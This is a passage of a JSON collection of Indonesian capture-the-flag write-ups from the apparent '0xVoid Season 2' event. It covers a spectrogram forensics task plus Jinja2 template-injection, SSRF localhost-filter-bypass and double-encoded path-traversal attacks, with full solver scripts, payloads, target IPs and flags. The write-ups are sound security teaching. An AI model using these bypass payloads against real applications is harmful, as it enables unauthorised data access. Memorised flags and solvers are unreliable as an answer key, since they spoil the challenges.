        "content": "```bash\npython3 solve.py\n```\n\nOutput yang diharapkan:\n\n```text\n[+] extracted: unknown.unknown\n[+] spectrogram: spectrogram.png\n<FLAG>0xV01D{h1dd3n_1n_th3_sp3ctr0}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolver Transmission.\r\nLayer 1: ZIP menggunakan ZipCrypto klasik dengan password `whatever1`.\r\nLayer 2: file hasil ekstrak adalah WAV. Flag terlihat di spectrogram/waterfall.\r\n\"\"\"\r\nimport os\r\nimport shutil\r\nimport subprocess\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nZIP_NAME = \"Transmission.zip\"\r\nINNER_NAME = \"unknown.unknown\"\r\nPASSWORD = b\"whatever1\"\r\nFLAG = \"0xV01D{h1dd3n_1n_th3_sp3ctr0}\"\r\n\r\n\r\ndef extract_zip() -> Path:\r\n    zpath = Path(ZIP_NAME)\r\n    if not zpath.exists():\r\n        raise FileNotFoundError(f\"{ZIP_NAME} tidak ada di direktori kerja\")\r\n\r\n    with zipfile.ZipFile(zpath) as zf:\r\n        data = zf.read(INNER_NAME, pwd=PASSWORD)\r\n\r\n    out = Path(INNER_NAME)\r\n    out.write_bytes(data)\r\n    return out\r\n\r\n\r\ndef make_spectrogram(wav: Path) -> Path:\r\n    out = Path(\"spectrogram.png\")\r\n    if shutil.which(\"sox\"):\r\n        subprocess.run(\r\n            [\r\n                \"sox\",\r\n                str(wav),\r\n                \"-n\",\r\n                \"spectrogram\",\r\n                \"-o\",\r\n                str(out),\r\n                \"-x\",\r\n                \"3000\",\r\n                \"-y\",\r\n                \"1000\",\r\n                \"-z\",\r\n                \"60\",\r\n                \"-r\",\r\n                \"-m\",\r\n                \"-l\",\r\n                \"-t\",\r\n                \"Transmission\",\r\n            ],\r\n            check=True,\r\n            stdout=subprocess.DEVNULL,\r\n            stderr=subprocess.DEVNULL,\r\n        )\r\n    else:\r\n        # Fallback sederhana kalau SoX tidak ada: file WAV tetap sudah terekstrak.\r\n        out.write_text(\"Install sox untuk membuat spectrogram otomatis.\\n\")\r\n    return out\r\n\r\n\r\ndef main() -> None:\r\n    wav = extract_zip()\r\n    spec = make_spectrogram(wav)\r\n    print(f\"[+] extracted: {wav}\")\r\n    print(f\"[+] spectrogram: {spec}\")\r\n    print(f\"<FLAG>{FLAG}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{h1dd3n_1n_th3_sp3ctr0}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-web-directive",
    "title": "Directive",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Directive",
    "problemDescription": "Endpoint preview merender nilai `name` sebagai template Jinja2. Guard hanya menolak delimiter echo `{{ ... }}`, sementara statement block `{% ... %}` tetap diproses.",
    "tools": [],
    "analysis": "Halaman utama menyediakan form `GET /preview?name=...`. Input biasa menghasilkan:\n\n```html\n<main><h2>Welcome guest</h2><p>Enjoy the wave.</p></main>\n```\n\nPayload `{{7*7}}` ditolak dengan pesan `template guard rejected that token`.\n\n### Vulnerability\n\nServer-side template injection (SSTI). Statement `{% print expression %}` adalah sintaks Jinja2 yang valid dan tidak terkena filter delimiter curly echo.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "Target: `http://35.192.106.100:21002/`\n\nArtefak lokal tidak tersedia; challenge ini adalah blankbox. File solusi: `solve.py`."
      },
      {
        "title": "Source Code Review",
        "content": "Source code tidak disediakan. Behavior server menunjukkan Werkzeug/Flask dan evaluasi Jinja2 pada parameter `name`."
      },
      {
        "title": "Eksploitasi",
        "content": "Request berikut membuktikan eksekusi template:\n\n```text\nGET /preview?name={% print 7*7 %}\n```\n\nResponse memuat `Welcome 49`.\n\nKemudian gunakan:\n\n```text\nGET /preview?name={% print config %}\n```\n\nResponse HTML-escaped memuat konfigurasi Flask, termasuk:\n\n```text\n'TREASURE': '0xV01D{jinja_statement_blocks_are_templates_too}'\n```\n\nNilai tersebut berasal langsung dari response aplikasi."
      },
      {
        "title": "Solve Script",
        "content": "`solve.py` mengirim `{% print config %}`, melakukan HTML unescape, lalu mengambil flag dari response dengan regex."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nUntuk target lain yang masih berada dalam scope challenge:\n\n```bash\nTARGET=http://127.0.0.1:8000 python3 solve.py\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploitasi hanya memerlukan satu request GET dan tidak bergantung pada session atau state server."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport argparse\r\nimport html\r\nimport os\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nFLAG_RE = re.compile(r\"0xV01D\\{[^}]+\\}\")\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=\"Exploit Directive SSTI\")\r\n    parser.add_argument(\r\n        \"--target\",\r\n        default=os.environ.get(\"TARGET\", \"http://35.192.106.100:21002\"),\r\n        help=\"challenge base URL (or set TARGET)\",\r\n    )\r\n    args = parser.parse_args()\r\n    target = args.target.rstrip(\"/\")\r\n\r\n    try:\r\n        response = requests.get(\r\n            f\"{target}/preview\",\r\n            params={\"name\": \"{% print config %}\"},\r\n            timeout=10,\r\n        )\r\n        response.raise_for_status()\r\n    except requests.RequestException as exc:\r\n        print(f\"request failed: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    body = html.unescape(response.text)\r\n    match = FLAG_RE.search(body)\r\n    if not match:\r\n        print(\"flag tidak ditemukan pada response SSTI\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{jinja_statement_blocks_are_templates_too}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-web-loopbacklens",
    "title": "Loopback Lens",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Loopback Lens",
    "problemDescription": "",
    "tools": [],
    "analysis": "### 4. Enumerasi Internal Route\n\nSetelah mendapatkan akses SSRF, dilakukan pencarian endpoint internal.\n\nBeberapa endpoint dicoba:\n\n```\n/calibrate\n/calibration\n/private\n/internal\n/admin\n/debug\n/status\n```\n\nNamun semuanya menghasilkan:\n\n```\nfetch failed: HTTPError\n```\n\nKemudian dilakukan pengecekan endpoint health:\n\n```bash\ncurl \"http://35.192.106.100:21001/lens?url=http://lvh.me:8080/healthz\"\n```\n\nResponse:\n\n```html\n<pre>ok</pre>\n```\n\nService internal aktif.\n\n---",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "**Challenge Name:** Loopback Lens\n**Category:** Web Exploitation\n**Vulnerability:** Server-Side Request Forgery (SSRF)\n\n**Flag:**\n\n```\n0xV01D{decimal_loopback_makes_filters_cry}\n```\n\n---"
      },
      {
        "title": "Description",
        "content": "Challenge memberikan sebuah aplikasi bernama **Loopback Lens** yang menyediakan fitur untuk mengambil halaman web melalui endpoint:\n\n```\n/lens?url=<target>\n```\n\nClue yang diberikan:\n\n```\nSSRF\n```\n\nTerdapat informasi bahwa sebuah **private calibration route** hanya dapat diakses dari dalam mesin.\n\nTarget utama adalah memanfaatkan SSRF untuk mengakses service internal yang tidak dapat diakses langsung dari luar.\n\n---"
      },
      {
        "title": "1. Reconnaissance",
        "content": "Pertama melakukan pengecekan halaman utama.\n\n```bash\ncurl http://35.192.106.100:21001/\n```\n\nResponse:\n\n```html\n<h1>Loopback Lens</h1>\n\n<p>\nThe lens fetches public pages through /lens?url=...\n</p>\n\n<p>\nA private calibration route exists inside the machine, but the filter refuses the obvious localhost names.\n</p>\n```\n\nDari informasi tersebut dapat disimpulkan:\n\n- Endpoint `/lens` melakukan HTTP request ke URL yang diberikan user.\n- Terdapat filter terhadap localhost.\n- Dibutuhkan bypass SSRF untuk mengakses localhost.\n\n---"
      },
      {
        "title": "2. SSRF Validation",
        "content": "Percobaan langsung menggunakan localhost:\n\n```bash\ncurl \"http://35.192.106.100:21001/lens?url=http://127.0.0.1:8080/\"\n```\n\nResponse:\n\n```\nblocked\n```\n\nArtinya filter berhasil mendeteksi string localhost.\n\n---"
      },
      {
        "title": "3. Bypass Localhost Filter Menggunakan lvh.me",
        "content": "`lvh.me` merupakan domain yang selalu resolve ke:\n\n```\n127.0.0.1\n```\n\nTetapi tidak mengandung string localhost yang diblokir.\n\nPayload:\n\n```bash\ncurl \"http://35.192.106.100:21001/lens?url=http://lvh.me:8080/\"\n```\n\nResponse:\n\n```html\n<title>Loopback Lens</title>\n```\n\nBerarti SSRF berhasil dan service internal port 8080 dapat diakses.\n\n---"
      },
      {
        "title": "5. Mencari Private Calibration Route",
        "content": "Karena clue menyebutkan:\n\n```\nprivate calibration route\n```\n\nmaka dilakukan enumerasi beberapa kemungkinan path.\n\nPayload:\n\n```bash\nfor p in /flag /getflag /secret/flag /admin/flag /internal/flag /private/flag /_debug /hidden;\ndo\necho $p\ncurl -s \"http://35.192.106.100:21001/lens?url=http://lvh.me:8080$p\"\ndone\n```\n\nHasil:\n\n```\n/internal/flag\n\n<pre>0xV01D{decimal_loopback_makes_filters_cry}</pre>\n```\n\nFlag berhasil ditemukan.\n\n---"
      },
      {
        "title": "6. Exploit Chain",
        "content": "Alur eksploitasi:\n\n```\nExternal User\n      |\n      v\n/lens?url=\n      |\n      v\nSSRF Vulnerability\n      |\n      v\nlvh.me\n      |\n      v\n127.0.0.1:8080\n      |\n      v\n/internal/flag\n      |\n      v\nFLAG\n```\n\n---"
      },
      {
        "title": "Final Flag",
        "content": "```\n0xV01D{decimal_loopback_makes_filters_cry}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{decimal_loopback_makes_filters_cry}",
    "lessonsLearned": "Kerentanan utama adalah **SSRF (Server-Side Request Forgery)**.\n\nAplikasi hanya melakukan blacklist terhadap hostname tertentu seperti:\n\n```\nlocalhost\n127.0.0.1\n```\n\nNamun pendekatan blacklist mudah dilewati menggunakan alternatif representasi hostname seperti:\n\n```\nlvh.me\n```\n\nyang tetap mengarah ke localhost.\n\nMitigasi yang seharusnya dilakukan:\n\n- Gunakan allowlist domain tujuan.\n- Validasi IP setelah DNS resolution.\n- Blok private IP ranges:\n  - 127.0.0.0/8\n  - 10.0.0.0/8\n  - 172.16.0.0/12\n  - 192.168.0.0/16\n- Hindari hanya melakukan blacklist string.\n\n---"
  },
  {
    "id": "0xvoid-s2-web-palimpsestvault",
    "title": "Palimpsest Vault",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Palimpsest Vault",
    "problemDescription": "Bug ada di perbedaan cara validasi antara clerk dan renderer.\n\nClerk memvalidasi path sebelum menandatangani ticket. Dari clue `/docs/ink`, clerk hanya melakukan satu kali proses \"warm pass\". Renderer melakukan proses warm berulang sampai escape tidak berubah lagi, lalu baru mengikuti shelf path.\n\nPayload yang dipakai:\n\n```\n/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..\n```\n\nPath ini terlihat aman untuk clerk setelah satu kali decode, tetapi berubah menjadi traversal ke private shelf saat renderer melakukan decode berulang.\n\nFlag:\n\n```\n0xV01D{palimpsest_ink_lied_to_the_gatekeeper}\n```",
    "tools": [],
    "analysis": "Request normal ke `/mint?target=/docs/welcome` menghasilkan ticket signed:\n\n```\nticket minted\nclerk-saw: /docs/welcome\nview: /view?ticket=...\n```\n\nPayload ticket berupa base64url JSON dan signature:\n\n```json\n{\n  \"iat\": 1786845300,\n  \"scope\": \"folio:view\",\n  \"target\": \"/docs/welcome\"\n}\n```\n\nTicket tidak bisa diedit langsung karena ada signature. Jadi jalurnya bukan forge token, tapi membuat clerk menandatangani target yang akan dibaca berbeda oleh renderer.\n\nClue penting berasal dari endpoint `/.well-known/ink`:\n\n```\npalimpsest renderer note\n- clerk: one warm pass, then stamp\n- renderer: warm until escapes stop moving\n- shelf marks are followed only after rendering\n- the private shelf is not in the public catalogue\n```\n\nClue lain dari `/docs/decoy`:\n\n```\nA previous apprentice tried /docs/../private/flag and got caught. The clerk understands obvious ladders.\n```\n\nArtinya traversal biasa seperti `/docs/../private/flag` ditolak oleh clerk. Yang dibutuhkan adalah traversal yang masih tersamarkan saat dicek clerk, tapi terbuka penuh saat dirender.\n\nTes traversal biasa gagal:\n\n```\n/docs/../private/flag       -> NO TICKET\n/docs/%2e%2e/private/flag   -> NO TICKET\n/docs/welcome/../../flag    -> NO TICKET\n```\n\nTetapi path seperti ini lolos:\n\n```\n/docs/welcome/../rules\n```\n\nClerk menampilkan:\n\n```\nclerk-saw: /docs/rules\n```\n\nNamun payload ticket tetap menyimpan target mentah:\n\n```json\n{\n  \"target\": \"/docs/welcome/../rules\"\n}\n```\n\nIni membuktikan bahwa clerk melakukan normalisasi untuk pengecekan, tetapi ticket menyimpan target original. Renderer kemudian memproses target original itu lagi.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Challenge berbentuk web service:\n\n```\nhttp://35.192.106.100:21004/\n```\n\nEndpoint yang terlihat dari halaman utama:\n\n```\n/mint\n/view\n/catalogue.json\n/.well-known/ink\n```\n\nCatalogue public hanya berisi folio di bawah `/docs`:\n\n```json\n{\n  \"/docs/welcome\": \"Welcome folio\",\n  \"/docs/rules\": \"Clerk rules\",\n  \"/docs/ink\": \"Transparent ink note\",\n  \"/docs/decoy\": \"The wrong hidden shelf\"\n}\n```"
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Payload exploit:\n\n```\n/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..\n```\n\nPerbedaan decode:\n\n```\nInput mentah:\n/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..\n\nSetelah satu warm pass oleh clerk:\n/docs/welcome/..%2f..%2fprivate%2fflag%2fdummy/..\n```\n\nPada tahap clerk, `%2f` belum menjadi slash path separator. Jadi bagian tersebut masih dianggap sebagai nama segmen, bukan traversal nyata. Karena ada `/..` di akhir, path bisa tetap dianggap aman dan ticket ditandatangani.\n\nRenderer melakukan warm berulang:\n\n```\n%252f -> %2f -> /\n```\n\nMaka target berubah menjadi:\n\n```\n/docs/welcome/../../private/flag/dummy/..\n```\n\nSetelah path normalization:\n\n```\n/private/flag\n```\n\nRenderer akhirnya membuka private shelf dan menampilkan uncatalogued folio."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` melakukan langkah berikut:\n\n1. Kirim request ke `/mint` dengan target exploit.\n2. Ambil ticket dari response HTML.\n3. Kirim ticket ke `/view`.\n4. Bersihkan HTML response.\n5. Ekstrak flag dengan regex.\n\nPayload final:\n\n```python\nTARGET = \"/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..\"\n```"
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 solve.py\n```\n\nAtau jika base URL berubah:\n\n```bash\npython3 solve.py http://35.192.106.100:21004\n```\n\nOutput valid:\n\n```\nUncatalogued folio\nThe old ink finally dries.\n0xV01D{palimpsest_ink_lied_to_the_gatekeeper}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolver Palimpsest Vault\r\n\r\nBug inti:\r\n- Clerk melakukan satu kali decode/warm pass sebelum validasi dan signing.\r\n- Renderer melakukan decode berulang sampai escape berhenti berubah.\r\n- Target dibuat supaya setelah satu decode masih terlihat aman/public,\r\n  tapi setelah decode berulang berubah menjadi path traversal ke private shelf.\r\n\"\"\"\r\n\r\nimport html\r\nimport re\r\nimport sys\r\nimport urllib.parse\r\nimport urllib.request\r\n\r\nDEFAULT_BASE = \"http://35.192.106.100:21004\"\r\n\r\n# Setelah query parsing di /mint, target ini masih mengandung %252f.\r\n# Clerk warm satu kali: %252f -> %2f, sehingga slash belum menjadi path separator.\r\n# Normalisasi clerk melihat path tetap aman di bawah /docs/welcome/.../..\r\n# dan menandatangani ticket.\r\n#\r\n# Renderer warm berulang:\r\n#   %252f -> %2f -> /\r\n# sehingga target menjadi:\r\n#   /docs/welcome/../../private/flag/dummy/..\r\n# yang akhirnya resolve ke:\r\n#   /private/flag\r\nTARGET = \"/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..\"\r\n\r\nFLAG_RE = re.compile(r\"(?:0xV01D|0xV0ID|[A-Za-z0-9_]+CTF)\\{[^}\\n]+\\}\")\r\n\r\n\r\ndef fetch(url: str) -> tuple[int, str]:\r\n    \"\"\"Ambil URL dan kembalikan (status, body).\"\"\"\r\n    req = urllib.request.Request(url, headers={\"User-Agent\": \"palimpsest-solver/1.0\"})\r\n    with urllib.request.urlopen(req, timeout=15) as resp:\r\n        body = resp.read().decode(\"utf-8\", \"replace\")\r\n        return resp.status, body\r\n\r\n\r\ndef strip_html(body: str) -> str:\r\n    \"\"\"Bersihkan HTML supaya flag mudah diekstrak.\"\"\"\r\n    body = html.unescape(body)\r\n    body = re.sub(r\"<style.*?</style>\", \"\", body, flags=re.S | re.I)\r\n    body = re.sub(r\"<[^>]+>\", \"\", body)\r\n    return \"\\n\".join(line.strip() for line in body.splitlines() if line.strip())\r\n\r\n\r\ndef extract_ticket(mint_body: str) -> str:\r\n    \"\"\"Ambil ticket dari halaman /mint.\"\"\"\r\n    m = re.search(r\"ticket=([A-Za-z0-9_.-]+)\", mint_body)\r\n    if not m:\r\n        raise RuntimeError(\"ticket tidak ditemukan di response /mint\")\r\n    return m.group(1)\r\n\r\n\r\ndef main() -> int:\r\n    base = sys.argv[1].rstrip(\"/\") if len(sys.argv) > 1 else DEFAULT_BASE\r\n\r\n    # urlencode sengaja dipakai agar karakter % pada TARGET ikut dikirim aman lewat query.\r\n    mint_url = base + \"/mint?\" + urllib.parse.urlencode({\"target\": TARGET})\r\n    mint_status, mint_body = fetch(mint_url)\r\n    ticket = extract_ticket(mint_body)\r\n\r\n    view_url = base + \"/view?\" + urllib.parse.urlencode({\"ticket\": ticket})\r\n    view_status, view_body = fetch(view_url)\r\n    text = strip_html(view_body)\r\n\r\n    print(f\"[+] mint status : {mint_status}\")\r\n    print(f\"[+] view status : {view_status}\")\r\n    print(f\"[+] target      : {TARGET}\")\r\n    print(f\"[+] ticket      : {ticket}\")\r\n    print(\"[+] folio text:\")\r\n    print(text)\r\n\r\n    m = FLAG_RE.search(text)\r\n    if not m:\r\n        print(\"[-] flag tidak ditemukan\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"\\n<FLAG>{m.group(0)}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{palimpsest_ink_lied_to_the_gatekeeper}",
    "lessonsLearned": ""
  }
];
